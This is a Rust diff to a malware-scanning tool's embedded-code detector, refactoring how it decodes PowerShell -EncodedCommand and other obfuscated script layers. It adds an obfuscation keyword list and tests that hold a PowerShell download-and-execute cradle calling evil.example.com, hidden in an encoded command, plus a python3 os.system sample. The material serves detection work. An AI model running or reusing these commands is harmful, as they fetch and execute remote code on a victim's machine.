@@ -113,7 +113,21 @@ pub fn detect_language_with_host(
     is_encoded: bool,
     host_file_type: Option<&FileType>,
 ) -> Option<FileType> {
-    let result = detect_language_inner(string_info, is_encoded)?;
+    detect_language_value(
+        &string_info.value,
+        string_info.string_type,
+        is_encoded,
+        host_file_type,
+    )
+}
+
+fn detect_language_value(
+    value: &str,
+    string_type: Option<crate::types::binary::StringType>,
+    is_encoded: bool,
+    host_file_type: Option<&FileType>,
+) -> Option<FileType> {
+    let result = detect_language_inner(value, &string_type, is_encoded)?;
 
     if let Some(host) = host_file_type {
         // Suppress false positives from syntactically similar languages.
@@ -181,13 +195,13 @@ fn is_curly_brace_family(file_type: &FileType) -> bool {
     )
 }
 
-fn detect_language_inner(string_info: &StringInfo, is_encoded: bool) -> Option<FileType> {
-    let value = &string_info.value;
-
+fn detect_language_inner(
+    value: &str,
+    kind: &Option<crate::types::binary::StringType>,
+    is_encoded: bool,
+) -> Option<FileType> {
     // Use stng's classification (either from extraction or by calling classify_string)
     use crate::types::binary::StringType;
-
-    let kind = &string_info.string_type;
 
     // Check if already classified as code by stng
     match kind {
@@ -821,6 +835,30 @@ pub enum EmbeddedAnalysisResult {
 pub fn analyze_embedded_string(
     parent_path: &str,
     string_info: &StringInfo,
+    string_index: usize,
+    capability_mapper: &Arc<CapabilityMapper>,
+    current_depth: usize,
+    host_file_type: Option<&FileType>,
+) -> Result<EmbeddedAnalysisResult> {
+    analyze_embedded_haystack(
+        parent_path,
+        &string_info.value,
+        string_info.offset.unwrap_or(0),
+        &string_info.encoding_chain,
+        string_info.string_type,
+        string_index,
+        capability_mapper,
+        current_depth,
+        host_file_type,
+    )
+}
+
+fn analyze_embedded_haystack(
+    parent_path: &str,
+    value: &str,
+    offset: u64,
+    encoding_chain: &[String],
+    string_type: Option<crate::types::binary::StringType>,
     _string_index: usize,
     capability_mapper: &Arc<CapabilityMapper>,
     current_depth: usize,
@@ -833,7 +871,7 @@ pub fn analyze_embedded_string(
 
     // Detect language (uses stng classification, no regex needed)
     let t_detect = std::time::Instant::now();
-    let is_encoded = !string_info.encoding_chain.is_empty();
+    let is_encoded = !encoding_chain.is_empty();
     // Interpreter inline-code (`python3 -c "<code>"`, `node -e '<code>'`):
     // unwrap to the inner source and analyze THAT as its real language so the
     // AST/metric rules see clean code, not a shell-string argument. Only for
@@ -841,37 +879,32 @@ pub fn analyze_embedded_string(
     let inline_code = if is_encoded {
         None
     } else {
-        extract_inline_interpreter_code(&string_info.value)
+        extract_inline_interpreter_code(value)
     };
-    let (file_type, source_to_analyze) = match inline_code {
-        Some((lang, code)) => (lang, code.to_string()),
-        None => {
-            let ft = detect_language_with_host(string_info, is_encoded, host_file_type)
-                .context("No language detected in string")?;
-            (ft, string_info.value.to_string())
-        }
-    };
-    let detect_time = t_detect.elapsed();
-
-    let offset = string_info.offset.unwrap_or(0);
 
     if is_encoded && is_inline_source_map_offset(parent_path, offset) {
         anyhow::bail!("Inline source map data URL, not embedded code");
     }
 
-    // Avoid reporting the parent file itself as "embedded" code when the detector
-    // reclassifies the full source buffer starting at offset 0x0. An explicit
-    // `interp -c "<code>"` invocation is genuinely a different embedded language
-    // (and was size/self bypassed deliberately), so it is never self-detection.
-    if inline_code.is_none()
-        && is_top_level_self_detection(parent_path, is_encoded, offset, &file_type, host_file_type)
-    {
-        anyhow::bail!("Top-level source self-detected as embedded code");
-    }
+    let (file_type, source_to_analyze) = match inline_code {
+        Some((lang, code)) => (lang, code),
+        None => {
+            let ft = detect_language_value(value, string_type, is_encoded, host_file_type)
+                .context("No language detected in string")?;
+            // Bail before analyzing the host as "embedded". Offset-0 plain
+            // source is the host file; `is_source_code` hosts always
+            // self-detect. Inline `python3 -c` unwrap above still runs.
+            if is_top_level_self_detection(parent_path, is_encoded, offset, &ft, host_file_type) {
+                anyhow::bail!("Top-level source self-detected as embedded code");
+            }
+            (ft, value)
+        }
+    };
+    let detect_time = t_detect.elapsed();
 
     // Create virtual path
     let virtual_path = if is_encoded {
-        encode_decoded_path(parent_path, &string_info.encoding_chain, offset as usize)
+        encode_decoded_path(parent_path, encoding_chain, offset as usize)
     } else {
         format!("{}##plain@{:#x}", parent_path, offset)
     };
@@ -882,7 +915,7 @@ pub fn analyze_embedded_string(
         .with_capability_mapper_arc(capability_mapper.clone())
         .without_embedded_detection();
     if is_encoded {
-        analyzer = analyzer.with_encoded_context(string_info.encoding_chain.clone());
+        analyzer = analyzer.with_encoded_context(encoding_chain.to_vec());
     }
 
     // Analyze in-memory.
@@ -901,9 +934,9 @@ pub fn analyze_embedded_string(
     let t_analyze = std::time::Instant::now();
     let virtual_path_ref = Path::new(&virtual_path);
     let report = if inline_code.is_some() {
-        analyzer.analyze_source_as_configured(virtual_path_ref, &source_to_analyze)
+        analyzer.analyze_source_as_configured(virtual_path_ref, source_to_analyze)
     } else {
-        analyzer.analyze_source(virtual_path_ref, &source_to_analyze)
+        analyzer.analyze_source(virtual_path_ref, source_to_analyze)
     };
     let analyze_time = t_analyze.elapsed();
 
@@ -913,7 +946,7 @@ pub fn analyze_embedded_string(
             detect_time,
             analyze_time,
             file_type,
-            string_info.value.len()
+            value.len()
         );
     }
 
@@ -922,7 +955,7 @@ pub fn analyze_embedded_string(
         let (mut file_entry, _, _) = report.into_file_analysis(0);
         file_entry.path = virtual_path.clone();
         file_entry.depth = (current_depth + 1) as u32;
-        file_entry.encoding = Some(string_info.encoding_chain.clone());
+        file_entry.encoding = Some(encoding_chain.to_vec());
 
         // Prefix evidence locations. The decoded layer renders against its own
         // buffer, so offsets stay local (shift 0); preserve them out of
@@ -943,7 +976,7 @@ pub fn analyze_embedded_string(
         // target "anything reached via hex" / "anything reached via
         // base64+gzip" without re-walking `encoding_chain` inline.
         file_entry.findings.extend(generate_encoded_layer_traits(
-            &string_info.encoding_chain,
+            encoding_chain,
             offset,
         ));
 
@@ -955,7 +988,7 @@ pub fn analyze_embedded_string(
         findings.push(generate_embedded_language_trait(
             &file_type,
             offset,
-            &string_info.value,
+            value,
         ));
 
         // Rewrite evidence to be parent-relative so the parent's
@@ -1025,12 +1058,15 @@ fn head_decodes_to_known_magic(string_info: &StringInfo) -> bool {
     {
         return magic_type(string_info.value.as_bytes()).is_some();
     }
-    if !looks_like_base64(&string_info.value) {
+    head_decodes_to_known_magic_text(&string_info.value)
+}
+
+fn head_decodes_to_known_magic_text(value: &str) -> bool {
+    if !looks_like_base64(value) {
         return false;
     }
     // 256 base64 chars decode to 192 bytes — plenty for any magic check.
-    let head_chars: String = string_info
-        .value
+    let head_chars: String = value
         .chars()
         .filter(|c| !c.is_whitespace())
         .take(256)
@@ -1279,38 +1315,64 @@ fn has_ps_keywords(s: &str) -> bool {
     PS_KEYWORDS.iter().filter(|&&kw| s.contains(kw)).count() >= 2
 }
 
-/// Detect and decode a PowerShell -EncodedCommand blob within `string_info`.
-fn detect_powershell_encoded_command(
-    parent_path: &str,
-    string_info: &StringInfo,
-    capability_mapper: &Arc<CapabilityMapper>,
-    current_depth: usize,
-) -> Option<FileAnalysis> {
-    if current_depth >= MAX_DECODE_DEPTH {
-        return None;
+fn file_type_for_script_language(language: &str) -> Option<FileType> {
+    match language {
+        "python" => Some(FileType::Python),
+        "javascript" => Some(FileType::JavaScript),
+        "php" => Some(FileType::Php),
+        "powershell" => Some(FileType::PowerShell),
+        _ => None,
     }
-    let blob = extract_ps_encoded_arg(&string_info.value)?;
-    let decoded = decode_utf16le(blob)?;
-    if !has_ps_keywords(&decoded) {
-        return None;
+}
+
+fn encoding_chain_for_deobfuscation(result: &stng::script::DeobfuscationResult) -> Vec<String> {
+    if result.language == "powershell" && result.chain_description.contains("utf16le") {
+        vec!["base64-utf16le".to_string()]
+    } else {
+        vec!["script".to_string()]
     }
+}
 
-    let offset = string_info.offset.unwrap_or(0);
-    let virtual_path = format!("{}##base64-utf16le@{:#x}", parent_path, offset);
+/// Cheap gate so we do not re-run stng's deobfuscator regexes on every
+/// clean source member. stng already ran them during string extract;
+/// this second pass only exists to keep `DeobfuscationResult.decoded`
+/// as a whole layer instead of shredded `ScriptDecode` fragments.
+fn host_may_contain_script_obfuscation(content: &str) -> bool {
+    const NEEDLES: &[&str] = &[
+        "EncodedCommand",
+        "encodedcommand",
+        "-EncodedC",
+        "-enc ",
+        "-Enc ",
+        " -ec ",
+        "FromBase64String",
+        "b64decode",
+        "base64_decode",
+        "atob(",
+        "atob (",
+        "eval(",
+        "String.fromCharCode",
+        "zlib.decompress",
+        "fromhex",
+        "codecs.decode",
+        "marshal.loads",
+        "gzinflate",
+        "str_rot13",
+        "Invoke-Expression",
+        "iex(",
+        "IEX(",
+    ];
+    NEEDLES.iter().any(|needle| content.contains(*needle))
+}
 
-    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::PowerShell)?
-        .with_capability_mapper_arc(capability_mapper.clone())
-        .without_embedded_detection();
-    let mut report = analyzer.analyze_source(Path::new(&virtual_path), &decoded);
-
-    report.findings.push(Finding {
+fn encoded_powershell_finding(parent_path: &str, decoded_len: usize, offset: u64) -> Finding {
+    Finding {
         src: None,
         kind: FindingKind::Capability,
         id: "binary/embedded/base64-powershell".to_string().into(),
         desc: format!(
             "PowerShell -EncodedCommand payload ({} chars decoded) at offset {:#x}",
-            decoded.len(),
-            offset
+            decoded_len, offset
         )
         .into(),
         conf: 0.95,
@@ -1320,21 +1382,138 @@ fn detect_powershell_encoded_command(
         evidence: vec![Evidence {
             method: "base64_utf16le_decode".to_string(),
             source: "embedded_code_detector".to_string(),
-            value: format!("decoded_chars={}", decoded.len()),
+            value: format!("decoded_chars={}", decoded_len),
             location: Some(format!("offset:{:#x}", offset)),
             ..Default::default()
         }],
         match_count: 1,
         trait_refs: vec![],
         source_file: Some(parent_path.to_string()),
-    });
+    }
+}
+
+/// Analyze a stng-decoded script payload as its own source layer.
+fn analyze_decoded_script_layer(
+    parent_path: &str,
+    decoded: &str,
+    offset: u64,
+    file_type: FileType,
+    encoding_chain: Vec<String>,
+    capability_mapper: &Arc<CapabilityMapper>,
+    current_depth: usize,
+    emit_encoded_powershell: bool,
+) -> Option<FileAnalysis> {
+    if current_depth >= MAX_DECODE_DEPTH || decoded.len() < MIN_ENCODED_SIZE {
+        return None;
+    }
+    // Keep EncodedCommand paths on the historical hex-offset form so existing
+    // `##base64-utf16le@0x…` layers compare against B2. Other script payloads
+    // use the shared decoded-path encoder.
+    let virtual_path = if emit_encoded_powershell {
+        format!("{}##base64-utf16le@{:#x}", parent_path, offset)
+    } else {
+        encode_decoded_path(parent_path, &encoding_chain, offset as usize)
+    };
+
+    let analyzer = UnifiedSourceAnalyzer::for_file_type(&file_type)?
+        .with_capability_mapper_arc(capability_mapper.clone())
+        .without_embedded_detection()
+        .with_encoded_context(encoding_chain.clone());
+    // Language comes from stng's deobfuscator (or the EncodedCommand
+    // fallback), not the virtual path — force the grammar.
+    let mut report = analyzer.analyze_source_as_configured(Path::new(&virtual_path), decoded);
+
+    if emit_encoded_powershell {
+        report.findings.push(encoded_powershell_finding(
+            parent_path,
+            decoded.len(),
+            offset,
+        ));
+    } else {
+        report
+            .findings
+            .extend(generate_encoded_layer_traits(&encoding_chain, offset));
+    }
 
     let (mut entry, _, _) = report.into_file_analysis(0);
     entry.path = virtual_path;
     entry.depth = (current_depth + 1) as u32;
-    entry.encoding = Some(vec!["base64-utf16le".to_string()]);
+    entry.encoding = Some(encoding_chain);
     entry.compute_summary();
     Some(entry)
+}
+
+/// Turn `stng::script::deobfuscate_script` payloads into embed layers.
+///
+/// This is the non-duplicate work: stng already found and decoded the
+/// blobs (and shreds them into `ScriptDecode` fragments for string
+/// matching). Cleave still needs the *full* decoded text as a typed
+/// source layer so AST/trait rules see the payload, not the fragments.
+pub(crate) fn analyze_script_deobfuscation_layers(
+    parent_path: &str,
+    content: &str,
+    capability_mapper: &Arc<CapabilityMapper>,
+    current_depth: usize,
+    cancelled: Option<&AtomicBool>,
+) -> Vec<FileAnalysis> {
+    if current_depth >= MAX_DECODE_DEPTH || !host_may_contain_script_obfuscation(content) {
+        return Vec::new();
+    }
+
+    let mut layers = Vec::new();
+    for result in stng::script::deobfuscate_script(content.as_bytes()) {
+        if cancelled.is_some_and(|flag| flag.load(Ordering::Acquire)) {
+            break;
+        }
+        let Some(file_type) = file_type_for_script_language(result.language) else {
+            continue;
+        };
+        let encoding_chain = encoding_chain_for_deobfuscation(&result);
+        let emit_encoded_powershell = file_type == FileType::PowerShell
+            && encoding_chain.iter().any(|step| step == "base64-utf16le");
+        if let Some(layer) = analyze_decoded_script_layer(
+            parent_path,
+            &result.decoded,
+            result.offset as u64,
+            file_type,
+            encoding_chain,
+            capability_mapper,
+            current_depth,
+            emit_encoded_powershell,
+        ) {
+            layers.push(layer);
+        }
+    }
+    layers
+}
+
+/// Detect and decode a PowerShell -EncodedCommand blob in `value`.
+///
+/// Fallback for binary/generic hosts that never ran source-tier script
+/// deobfuscation. Unified source analysis uses
+/// [`analyze_script_deobfuscation_layers`] instead.
+fn detect_powershell_encoded_command(
+    parent_path: &str,
+    value: &str,
+    offset: u64,
+    capability_mapper: &Arc<CapabilityMapper>,
+    current_depth: usize,
+) -> Option<FileAnalysis> {
+    let blob = extract_ps_encoded_arg(value)?;
+    let decoded = decode_utf16le(blob)?;
+    if !has_ps_keywords(&decoded) {
+        return None;
+    }
+    analyze_decoded_script_layer(
+        parent_path,
+        &decoded,
+        offset,
+        FileType::PowerShell,
+        vec!["base64-utf16le".to_string()],
+        capability_mapper,
+        current_depth,
+        true,
+    )
 }
 
 /// Process all strings from a file, analyzing detected code
@@ -1356,6 +1535,8 @@ pub(crate) fn process_all_strings(
         current_depth,
         host_file_type,
         cancelled,
+        false,
+        None,
     )
 }
 
@@ -1365,6 +1546,97 @@ pub(crate) fn process_all_strings(
 /// the raw text is still scanned as a plain "mention", but `for:[shell]`/etc.
 /// rules must not fire on documentation. Container/markup types that genuinely
 /// carry executable payloads in malware (HTML, XML, JSON, plists) are NOT listed.
+///
+/// `skip_powershell_encoded_command`: unified source analysis already turned
+/// stng `deobfuscate_script` payloads into layers; do not re-decode
+/// `-EncodedCommand` on those hosts. Binary/generic callers leave this false.
+///
+/// `host_plain`: borrowed full-file haystack so unified source analysis can
+/// still classify the host (B1r) without `content.to_string()` +
+/// `strings.clone()` per member.
+enum EmbedCand<'a> {
+    Extracted(usize, &'a StringInfo),
+    HostPlain(&'a str),
+}
+
+impl<'a> EmbedCand<'a> {
+    fn value(&self) -> &'a str {
+        match self {
+            Self::Extracted(_, info) => info.value.as_str(),
+            Self::HostPlain(value) => value,
+        }
+    }
+
+    fn offset(&self) -> u64 {
+        match self {
+            Self::Extracted(_, info) => info.offset.unwrap_or(0),
+            Self::HostPlain(_) => 0,
+        }
+    }
+
+    fn encoding_chain_empty(&self) -> bool {
+        match self {
+            Self::Extracted(_, info) => info.encoding_chain.is_empty(),
+            Self::HostPlain(_) => true,
+        }
+    }
+
+    fn has_script_encoding(&self) -> bool {
+        match self {
+            Self::Extracted(_, info) => info.encoding_chain.iter().any(|step| step == "script"),
+            Self::HostPlain(_) => false,
+        }
+    }
+
+    fn extracted(&self) -> Option<(usize, &'a StringInfo)> {
+        match *self {
+            Self::Extracted(idx, info) => Some((idx, info)),
+            Self::HostPlain(_) => None,
+        }
+    }
+
+    fn encoding_chain(&self) -> &'a [String] {
+        match self {
+            Self::Extracted(_, info) => &info.encoding_chain,
+            Self::HostPlain(_) => &[],
+        }
+    }
+
+    fn string_type(&self) -> Option<crate::types::binary::StringType> {
+        match self {
+            Self::Extracted(_, info) => info.string_type,
+            Self::HostPlain(_) => None,
+        }
+    }
+
+    fn index(&self) -> usize {
+        match *self {
+            Self::Extracted(idx, _) => idx,
+            Self::HostPlain(_) => 0,
+        }
+    }
+
+    fn score(&self) -> usize {
+        let is_code = |kind: Option<crate::types::binary::StringType>| -> bool {
+            matches!(
+                kind,
+                Some(
+                    crate::types::binary::StringType::PythonCode
+                        | crate::types::binary::StringType::JavaScriptCode
+                        | crate::types::binary::StringType::PhpCode
+                        | crate::types::binary::StringType::ShellCmd
+                        | crate::types::binary::StringType::AppleScript
+                )
+            )
+        };
+        match self {
+            Self::Extracted(_, info) if is_code(info.string_type) => 1_000_000,
+            Self::Extracted(_, info) => info.value.len(),
+            Self::HostPlain(value) => value.len(),
+        }
+    }
+}
+
 pub(crate) fn process_all_strings_with_host(
     parent_path: &str,
     strings: &[StringInfo],
@@ -1372,6 +1644,8 @@ pub(crate) fn process_all_strings_with_host(
     current_depth: usize,
     host_file_type: Option<&FileType>,
     cancelled: Option<&AtomicBool>,
+    skip_powershell_encoded_command: bool,
+    host_plain: Option<&str>,
 ) -> (Vec<FileAnalysis>, Vec<Finding>) {
     if is_source_map_string_set(strings) {
         tracing::debug!(
@@ -1403,48 +1677,35 @@ pub(crate) fn process_all_strings_with_host(
     let mut detected_count = 0;
 
     let t_start = std::time::Instant::now();
-    let total_string_bytes: usize = strings.iter().map(|s| s.value.len()).sum();
-    let max_string_len = strings.iter().map(|s| s.value.len()).max().unwrap_or(0);
+    let host_len = host_plain.map_or(0, str::len);
+    let total_string_bytes: usize = strings.iter().map(|s| s.value.len()).sum::<usize>() + host_len;
+    let max_string_len = strings
+        .iter()
+        .map(|s| s.value.len())
+        .chain(host_plain.map(str::len))
+        .max()
+        .unwrap_or(0);
     tracing::trace!(
         "embedded_code_detector: Processing {} strings (total {} bytes, max {} bytes)",
-        strings.len(),
+        strings.len() + usize::from(host_plain.is_some()),
         total_string_bytes,
         max_string_len
     );
 
-    // Apply heuristic sorting to check most likely candidates first (like stng's XOR optimization)
-    // We prioritize longer strings, and strings already classified as code by stng
-    let mut sorted_strings: Vec<(usize, &StringInfo)> = strings.iter().enumerate().collect();
-    sorted_strings.sort_by(|(_, a), (_, b)| {
-        let is_code = |kind: &Option<crate::types::binary::StringType>| -> bool {
-            matches!(
-                kind,
-                Some(
-                    crate::types::binary::StringType::PythonCode
-                        | crate::types::binary::StringType::JavaScriptCode
-                        | crate::types::binary::StringType::PhpCode
-                        | crate::types::binary::StringType::ShellCmd
-                        | crate::types::binary::StringType::AppleScript
-                )
-            )
-        };
-        let score_a = if is_code(&a.string_type) {
-            1000000
-        } else {
-            a.value.len()
-        };
-        let score_b = if is_code(&b.string_type) {
-            1000000
-        } else {
-            b.value.len()
-        };
-        score_b.cmp(&score_a)
-    });
+    let mut sorted: Vec<EmbedCand<'_>> = strings
+        .iter()
+        .enumerate()
+        .map(|(idx, info)| EmbedCand::Extracted(idx, info))
+        .collect();
+    if let Some(host) = host_plain {
+        sorted.push(EmbedCand::HostPlain(host));
+    }
+    sorted.sort_by_key(|cand| std::cmp::Reverse(cand.score()));
 
     let mut detection_attempts = 0;
-    let max_detection_attempts = std::cmp::min(256, strings.len()); // Check the 256 longest/most likely strings in massive files
+    let max_detection_attempts = sorted.len().min(256);
 
-    for (idx, string_info) in sorted_strings {
+    for cand in sorted {
         if cancelled.is_some_and(|f| f.load(Ordering::Acquire)) {
             break;
         }
@@ -1469,6 +1730,9 @@ pub(crate) fn process_all_strings_with_host(
             break;
         }
 
+        let value = cand.value();
+        let offset = cand.offset();
+
         // Strings over 1 MB are a performance trap for the heavyweight
         // detectors (full base64 decode + magic walk + recursive
         // analysis). But they're *also* the exact shape a packed
@@ -1478,15 +1742,19 @@ pub(crate) fn process_all_strings_with_host(
         // string's first ~256 base64 chars rules out a packed binary;
         // otherwise let the full pipeline run.
         const MAX_STRING_SIZE_FOR_DETECTION: usize = 1024 * 1024; // 1MB
-        if string_info.value.len() > MAX_STRING_SIZE_FOR_DETECTION
-            && !head_decodes_to_known_magic(string_info)
-        {
-            continue;
+        if value.len() > MAX_STRING_SIZE_FOR_DETECTION {
+            let magic = match cand.extracted() {
+                Some((_, info)) => head_decodes_to_known_magic(info),
+                None => head_decodes_to_known_magic_text(value),
+            };
+            if !magic {
+                continue;
+            }
         }
 
         // Benign XML/HTML/SVG template literals often contain namespace URLs and tags that
         // confuse generic code classifiers. Skip passive markup here before any deeper analysis.
-        if string_info.encoding_chain.is_empty() && looks_like_passive_markup(&string_info.value) {
+        if cand.encoding_chain_empty() && looks_like_passive_markup(value) {
             continue;
         }
 
@@ -1495,24 +1763,43 @@ pub(crate) fn process_all_strings_with_host(
         // look like an embedded second language to string classification. Do not
         // promote plain component markup to an embedded-code layer; encoded
         // content inside the component still flows through the payload checks.
-        if should_skip_component_source_markup(parent_path, string_info, host_file_type) {
+        if match cand.extracted() {
+            Some((_, info)) => {
+                should_skip_component_source_markup(parent_path, info, host_file_type)
+            }
+            None => {
+                is_component_source_host(parent_path, host_file_type)
+                    && looks_like_component_source_markup(value)
+            }
+        } {
+            continue;
+        }
+
+        // stng `ScriptDecode` fragments (and the full decoded payload, once
+        // ingested) are string-matching material. The typed source layer
+        // comes from `analyze_script_deobfuscation_layers`, not a second
+        // walk of shredded pieces.
+        if cand.has_script_encoding() {
             continue;
         }
 
         detection_attempts += 1;
 
         // Check for PowerShell -EncodedCommand blobs first
-        if let Some(ps_layer) = detect_powershell_encoded_command(
-            parent_path,
-            string_info,
-            capability_mapper,
-            current_depth,
-        ) {
-            detected_count += 1;
-            total_bytes += string_info.value.len();
-            total_analyzed += 1;
-            encoded_layers.push(ps_layer);
-            continue;
+        if !skip_powershell_encoded_command {
+            if let Some(ps_layer) = detect_powershell_encoded_command(
+                parent_path,
+                value,
+                offset,
+                capability_mapper,
+                current_depth,
+            ) {
+                detected_count += 1;
+                total_bytes += value.len();
+                total_analyzed += 1;
+                encoded_layers.push(ps_layer);
+                continue;
+            }
         }
 
         // Check for base64-encoded binary payloads (PE, ELF, archives).
@@ -1521,12 +1808,37 @@ pub(crate) fn process_all_strings_with_host(
         // produced from a container payload (tar.gz members,
         // archive contents, sub-sub-files). All entries already
         // carry their final depth.
-        let bin_entries = detect_base64_binary(
-            parent_path,
-            string_info,
-            current_depth as u32,
-            capability_mapper,
-        );
+        let bin_entries = match cand.extracted() {
+            Some((_, info)) => detect_base64_binary(
+                parent_path,
+                info,
+                current_depth as u32,
+                capability_mapper,
+            ),
+            None => {
+                // Host haystack: only copy into a StringInfo if it actually
+                // looks like packed base64. Source files almost never do.
+                if looks_like_base64(value) {
+                    let tmp = StringInfo {
+                        value: value.to_string().into(),
+                        offset: Some(offset),
+                        string_type: None,
+                        encoding: "utf-8".to_string(),
+                        section: None,
+                        encoding_chain: Vec::new(),
+                        fragments: None,
+                    };
+                    detect_base64_binary(
+                        parent_path,
+                        &tmp,
+                        current_depth as u32,
+                        capability_mapper,
+                    )
+                } else {
+                    Vec::new()
+                }
+            }
+        };
         if let Some(bin_layer) = bin_entries.first() {
             let payload_key = (
                 bin_layer.file_type.clone(),
@@ -1541,30 +1853,32 @@ pub(crate) fn process_all_strings_with_host(
                 continue;
             }
             detected_count += 1;
-            total_bytes += string_info.value.len();
+            total_bytes += value.len();
             total_analyzed += 1;
             encoded_layers.extend(bin_entries);
             continue;
         }
 
-        // Try to analyze this string as source code
-        match analyze_embedded_string(
+        match analyze_embedded_haystack(
             parent_path,
-            string_info,
-            idx,
+            value,
+            offset,
+            cand.encoding_chain(),
+            cand.string_type(),
+            cand.index(),
             capability_mapper,
             current_depth,
             host_file_type,
         ) {
             Ok(EmbeddedAnalysisResult::EncodedLayer(file_analysis)) => {
                 detected_count += 1;
-                total_bytes += string_info.value.len();
+                total_bytes += value.len();
                 total_analyzed += 1;
                 encoded_layers.push(*file_analysis);
             }
             Ok(EmbeddedAnalysisResult::PlainEmbedded(findings)) => {
                 detected_count += 1;
-                total_bytes += string_info.value.len();
+                total_bytes += value.len();
                 total_analyzed += 1;
                 plain_findings.extend(findings);
             }
@@ -2101,5 +2415,119 @@ IAAAAAAAsDyZDwU=";
     fn test_is_real_shell_rejects_cli_help_snippet() {
         let s = "Binary output can mess up your terminal. Use \"--output -\" to tell curl to output it to your terminal anyway, or consider \"--output <FILE>\".";
         assert!(!is_real_shell(s));
+    }
+
+    #[test]
+    fn test_script_deobfuscation_layers_powershell_encoded_command() {
+        use base64::Engine;
+        let ps_code =
+            "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
+        let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
+        let ps = format!(
+            "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}\n"
+        );
+        let layers =
+            analyze_script_deobfuscation_layers("stager.ps1", &ps, &test_mapper(), 0, None);
+        assert!(
+            layers.iter().any(|file| {
+                file.findings
+                    .iter()
+                    .any(|finding| finding.id.contains("base64-powershell"))
+            }),
+            "expected EncodedCommand layer from stng deobfuscator"
+        );
+    }
+
+    #[test]
+    fn test_script_deobfuscation_layers_python_exec_b64() {
+        let src = concat!(
+            "#!/usr/bin/env python3\nimport base64\n",
+            "exec(base64.b64decode(\"cHJpbnQoJ2hlbGxvIGZyb20gbWFsd2FyZScp\"))\n",
+        );
+        let layers = analyze_script_deobfuscation_layers("drop.py", src, &test_mapper(), 0, None);
+        assert!(
+            layers.iter().any(|file| {
+                file.encoding
+                    .as_ref()
+                    .is_some_and(|chain| chain.iter().any(|step| step == "script"))
+            }),
+            "expected script-decoded python layer"
+        );
+    }
+
+    #[test]
+    fn test_process_all_strings_skips_encoded_command_when_asked() {
+        use base64::Engine;
+        let ps_code =
+            "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
+        let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
+        let ps = format!("powershell.exe -EncodedCommand {b64}\n");
+        let info = make_string_info(&ps);
+        let mapper = test_mapper();
+        let (with_scan, _) = process_all_strings(
+            "stager.ps1",
+            std::slice::from_ref(&info),
+            &mapper,
+            0,
+            None,
+            None,
+        );
+        let (skipped, _) =
+            process_all_strings_with_host("stager.ps1", &[info], &mapper, 0, None, None, true, None);
+        assert!(
+            with_scan.iter().any(|file| {
+                file.findings
+                    .iter()
+                    .any(|finding| finding.id.contains("base64-powershell"))
+            }),
+            "fallback EncodedCommand scan should still fire for binary/generic hosts"
+        );
+        assert!(
+            skipped.iter().all(|file| {
+                file.findings
+                    .iter()
+                    .all(|finding| !finding.id.contains("base64-powershell"))
+            }),
+            "unified source path must not re-scan EncodedCommand"
+        );
+    }
+
+    #[test]
+    fn test_extract_inline_interpreter_code_python3() {
+        let host = "#!/bin/sh\npython3 -c \"import os, sys; os.system('id'); print(sys.version)\"\n";
+        let (lang, code) =
+            extract_inline_interpreter_code(host).expect("python3 -c body should unwrap");
+        assert_eq!(lang, FileType::Python);
+        assert!(code.contains("os.system"));
+    }
+
+    #[test]
+    fn test_host_plain_unwraps_inline_python_in_shell() {
+        // B1r: skip HostPlain on is_source_code() dropped python3 -c unwrap
+        // on the full-file haystack (identity-command-python-call).
+        let host = concat!(
+            "#!/bin/sh\n",
+            "python3 -c \"import os, sys; os.system('id'); print(sys.version)\"\n",
+        );
+        let mapper = test_mapper();
+        let (_layers, findings) = process_all_strings_with_host(
+            "wrapper.sh",
+            &[],
+            &mapper,
+            0,
+            Some(&FileType::Shell),
+            None,
+            true,
+            Some(host),
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.id == "metadata/lang/embedded::python"),
+            "HostPlain shell must still unwrap python3 -c; got {:?}",
+            findings.iter().map(|f| &f.id).collect::<Vec<_>>(),
+        );
     }
 }
